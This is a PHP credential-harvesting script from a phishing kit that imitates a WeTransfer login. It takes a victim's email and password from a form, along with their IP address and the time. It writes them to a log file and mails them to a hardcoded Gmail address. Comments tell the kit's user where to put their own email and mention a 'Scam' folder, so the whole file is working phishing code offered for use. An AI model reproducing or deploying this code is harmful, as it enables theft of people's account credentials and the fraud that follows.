<?php

$email = $_POST['X1'];
$Password= $_POST['X2'];


$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];

$tn = 'wongli.kst@gmail.com'; /////////////// PUT YOUR EMAIL HERE \\\\\\\\\\\\\\\\

{
$JarJar = "+---------[Wetransfer]----------+
+ Email    : $email
+ Password : $Password
+-----------[ Info ]-----------+
+ Client IP : http://www.geoiptool.com/?IP=$ip
+ Date Log  : $date
+ Time Log  : $time
+---------[Anyi^]----------+";
$file = fopen("zm/zm.txt","a");   //// Save Password in LOGIN.txt / To Change Directory Or Folder Back Add (../) Ex: ../Dir/Scam/LOGIN.txt
fwrite($file,$JarJar);
$subject = "Wetransfer log";
$headers = "From: Anyi-BABA info";
$headers .= "MIME-Version: 1.0\n";
mail($tn,$subject,$JarJar,$headers);
}
?>